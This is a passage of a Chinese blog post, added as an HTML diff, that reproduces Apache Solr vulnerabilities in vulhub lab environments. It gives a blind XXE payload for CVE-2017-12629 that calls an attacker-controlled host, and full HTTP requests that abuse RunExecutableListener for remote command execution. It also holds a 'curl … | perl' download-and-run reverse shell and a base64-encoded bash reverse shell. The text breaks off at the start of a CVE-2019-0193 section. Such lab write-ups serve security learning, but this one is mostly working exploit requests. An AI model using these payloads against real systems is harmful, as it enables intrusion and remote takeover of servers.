@@ -1,0 +1,1382 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="漏洞复现,Apache Solr,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Demos's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="Apache Solr系列漏洞复现Solr是一个独立的企业级搜索应用服务器，它对外提供类似于web-service的API接口。  Solr使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。 CVE-2017-12629-RCE+XXE CVE-2017-12629包含两个漏洞，Apache Solr RCE+XXE，RCE执行命令时是无回显的，所以此处以反弹sh">
+<meta name="keywords" content="漏洞复现,Apache Solr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache Solr系列漏洞复现">
+<meta property="og:url" content="https://www.lsowl.top/2019/11/15/Apache-Solr系列漏洞复现/index.html">
+<meta property="og:site_name" content="Demos&#39;s Blog">
+<meta property="og:description" content="Apache Solr系列漏洞复现Solr是一个独立的企业级搜索应用服务器，它对外提供类似于web-service的API接口。  Solr使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。 CVE-2017-12629-RCE+XXE CVE-2017-12629包含两个漏洞，Apache Solr RCE+XXE，RCE执行命令时是无回显的，所以此处以反弹sh">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573804180.81.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573804645.02.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573804864.67.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573805006.28.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573806816.66.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573806845.46.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573807013.18.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573821786.72.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573822375.37.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573822566.61.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573572343.97.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573572408.89.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573572546.45.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573572814.96.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573572941.76.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573796814.7.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573796877.68.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573796959.18.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573798112.15.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573798131.81.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573798261.44.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573801748.0.png">
+<meta property="og:updated_time" content="2019-11-15T13:10:44.710Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Apache Solr系列漏洞复现">
+<meta name="twitter:description" content="Apache Solr系列漏洞复现Solr是一个独立的企业级搜索应用服务器，它对外提供类似于web-service的API接口。  Solr使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。 CVE-2017-12629-RCE+XXE CVE-2017-12629包含两个漏洞，Apache Solr RCE+XXE，RCE执行命令时是无回显的，所以此处以反弹sh">
+<meta name="twitter:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573804180.81.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.lsowl.top/2019/11/15/Apache-Solr系列漏洞复现/">
+
+
+
+
+
+  <title>Apache Solr系列漏洞复现 | Demos's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Demos's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">It's A Long Road</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.lsowl.top/2019/11/15/Apache-Solr系列漏洞复现/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Demos">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Demos's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Apache Solr系列漏洞复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-15T21:09:24+08:00">
+                2019-11-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞复现</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3,340
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  17
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Apache-Solr系列漏洞复现"><a href="#Apache-Solr系列漏洞复现" class="headerlink" title="Apache Solr系列漏洞复现"></a>Apache Solr系列漏洞复现</h2><p>Solr是一个独立的企业级搜索应用服务器，它对外提供类似于web-service的API接口。  Solr使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。</p>
+<h2 id="CVE-2017-12629-RCE-XXE"><a href="#CVE-2017-12629-RCE-XXE" class="headerlink" title="CVE-2017-12629-RCE+XXE"></a><strong>CVE-2017-12629-RCE+XXE</strong></h2><blockquote>
+<p>CVE-2017-12629包含两个漏洞，Apache Solr RCE+XXE，RCE执行命令时是无回显的，所以此处以反弹shell为主</p>
+</blockquote>
+<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：<a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-XXE" target="_blank" rel="noopener">XML实体扩展漏洞（XXE）</a>和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>7.1.0之前版本</p>
+<h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p><a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-RCE" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-RCE</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>命令执行成功后，需要等待一会，之后访问<code>http://your-ip:8983/</code>即可查看到Apache solr的管理页面，无需登录。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h4><p>由于返回包中不包含我们传入的XML中的信息，所以这是一个Blind XXE漏洞，我们发送如下数据包（自行修改其中的XXE Payload）</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/solr/demo/<span class="keyword">select</span>?<span class="keyword">q</span>=%3C%3Fxml%20version%3D%221.<span class="number">0</span>%22%20encoding%3D%22UTF-<span class="number">8</span>%22%3F%3E%0A%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22https%3A%2F%2F192.<span class="number">168.1</span>.<span class="number">102</span>:<span class="number">8000</span>/sorl.pl%2F%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>
+<p>访问时修改192.168.1.102:8000/sorl.pl为一个可监控的地址即可</p>
+<p>复现</p>
+<p>由于使用了RCE的环境,创建完访问有点抽风，所以访问时会报400的错误，但是不影响XML的传入</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.103</span>:<span class="number">8983</span>/solr/demo/<span class="keyword">select</span>?<span class="keyword">q</span>=%3C%3Fxml%20version%3D%221.<span class="number">0</span>%22%20encoding%3D%22UTF-<span class="number">8</span>%22%3F%3E%0A%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22https%3A%2F%2F192.<span class="number">168.1</span>.<span class="number">102</span>:<span class="number">8000</span>/sorl.pl%2F%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573804180.81.png" alt></p>
+<h4 id="RCE复现"><a href="#RCE复现" class="headerlink" title="RCE复现"></a>RCE复现</h4><h5 id="执行命令创建一个文件"><a href="#执行命令创建一个文件" class="headerlink" title="执行命令创建一个文件"></a>执行命令创建一个文件</h5><p>首先创建一个listener，其中设置exe的值为我们想执行的命令，args的值是命令参数：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/<span class="number">1.1</span></span><br><span class="line">Host: your-ip</span><br><span class="line">Accept: *<span class="regexp">/*</span></span><br><span class="line"><span class="regexp">Accept-Language: en</span></span><br><span class="line"><span class="regexp">User-Agent: Mozilla/</span><span class="number">5.0</span> (compatible; MSIE <span class="number">9.0</span>; Windows NT <span class="number">6.1</span>; Win64; x64; Trident/<span class="number">5.0</span>)</span><br><span class="line">Connection: <span class="keyword">close</span></span><br><span class="line">Content-Length: <span class="number">158</span></span><br><span class="line"> </span><br><span class="line">&#123;<span class="string">"add-listener"</span>:&#123;<span class="string">"event"</span>:<span class="string">"postCommit"</span>,<span class="string">"name"</span>:<span class="string">"newlistener"</span>,<span class="string">"class"</span>:<span class="string">"solr.RunExecutableListener"</span>,<span class="string">"exe"</span>:<span class="string">"sh"</span>,<span class="string">"dir"</span>:<span class="string">"/bin/"</span>,<span class="string">"args"</span>:[<span class="string">"-c"</span>, <span class="string">"touch /tmp/success"</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>访问的demo为core名</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573804645.02.png" alt></p>
+<p>创建listener，执行创建文件的命令</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">1.103</span>:<span class="number">8983</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">77.0</span>.<span class="number">3865.120</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">9</span>,image/webp,image/apng,*<span class="regexp">/*;q=0.8,application/signed</span>-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">9</span>,en;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line">Cookie: security_level=<span class="number">0</span></span><br><span class="line">Connection: <span class="keyword">close</span></span><br><span class="line">Content-Length: <span class="number">158</span></span><br><span class="line"> </span><br><span class="line">&#123;<span class="string">"add-listener"</span>:&#123;<span class="string">"event"</span>:<span class="string">"postCommit"</span>,<span class="string">"name"</span>:<span class="string">"newlistener"</span>,<span class="string">"class"</span>:<span class="string">"solr.RunExecutableListener"</span>,<span class="string">"exe"</span>:<span class="string">"sh"</span>,<span class="string">"dir"</span>:<span class="string">"/bin/"</span>,<span class="string">"args"</span>:[<span class="string">"-c"</span>, <span class="string">"touch /tmp/success"</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573804864.67.png" alt></p>
+<p>进行update触发(主机修改路径为update、添加Content-Type: application/json、以及post的数据如下即可)</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/demo/update HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">1.103</span>:<span class="number">8983</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">77.0</span>.<span class="number">3865.120</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">9</span>,image/webp,image/apng,*<span class="regexp">/*;q=0.8,application/signed</span>-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">9</span>,en;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line">Cookie: security_level=<span class="number">0</span></span><br><span class="line">Connection: <span class="keyword">close</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: <span class="number">17</span></span><br><span class="line"> </span><br><span class="line">[&#123;<span class="string">"id"</span>:<span class="string">"test"</span>&#125;]</span><br></pre></td></tr></table></figure>
+<p>查看结果：写入成功</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573805006.28.png" alt></p>
+<h5 id="反弹shell-perl"><a href="#反弹shell-perl" class="headerlink" title="反弹shell(perl)"></a>反弹shell(perl)</h5><blockquote>
+<p>这里要注意的是，如果没有添加listener，POST数据时使用add-listener即可，如果已经添加过，需要使用update-listener</p>
+</blockquote>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.102</span>:<span class="number">8000</span>/solr.pl | perl</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573806816.66.png" alt></p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">1.103</span>:<span class="number">8983</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">77.0</span>.<span class="number">3865.120</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">9</span>,image/webp,image/apng,*<span class="regexp">/*;q=0.8,application/signed</span>-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">9</span>,en;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line">Cookie: security_level=<span class="number">0</span></span><br><span class="line">Connection: <span class="keyword">close</span></span><br><span class="line">Content-Length: <span class="number">188</span></span><br><span class="line"> </span><br><span class="line">&#123;<span class="string">"update-listener"</span>:&#123;<span class="string">"event"</span>:<span class="string">"postCommit"</span>,<span class="string">"name"</span>:<span class="string">"newlistener"</span>,<span class="string">"class"</span>:<span class="string">"solr.RunExecutableListener"</span>,<span class="string">"exe"</span>:<span class="string">"sh"</span>,<span class="string">"dir"</span>:<span class="string">"/bin/"</span>,<span class="string">"args"</span>:[<span class="string">"-c"</span>, <span class="string">"curl http://192.168.1.102:8000/solr.pl | perl"</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573806845.46.png" alt></p>
+<p>进行update触发配置的listener</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/demo/update HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">1.103</span>:<span class="number">8983</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">77.0</span>.<span class="number">3865.120</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">9</span>,image/webp,image/apng,*<span class="regexp">/*;q=0.8,application/signed</span>-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">9</span>,en;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line">Cookie: security_level=<span class="number">0</span></span><br><span class="line">Connection: <span class="keyword">close</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: <span class="number">17</span></span><br><span class="line"> </span><br><span class="line">[&#123;<span class="string">"id"</span>:<span class="string">"test"</span>&#125;]</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573807013.18.png" alt></p>
+<h5 id="反弹shell-bash"><a href="#反弹shell-bash" class="headerlink" title="反弹shell(bash)"></a>反弹shell(bash)</h5><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAyLzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+<p>bash在实际测试中弹成功了。本地没成功</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-RCE" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-RCE</a> </p>
+<p><a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-XXE" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-XXE</a> </p>
+<h2 id="Apache-Solr远程代码执行漏洞-CVE-2019-0193-Exploit"><a href="#Apache-Solr远程代码执行漏洞-CVE-2019-0193-Exploit" class="headerlink" title="Apache Solr远程代码执行漏洞(CVE-2019-0193) Exploit"></a>Apache Solr远程代码执行漏洞(CVE-2019-0193) Exploit</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。 </p>
+<h3 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p><a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193</a></p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br><span class="line">docker-compose <span class="keyword">exec</span> solr bash bin/solr create_core -c test -d example/example-DIH/solr/db</span><br></pre></td></tr></table></figure>
+<p>运行环境后建立一个core:test</p>
+<p>命令执行成功后，需要等待一会，之后访问<code>http://your-ip:8983/</code>即可查看到Apache solr的管理页面，无需登录。 </p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><blockquote>
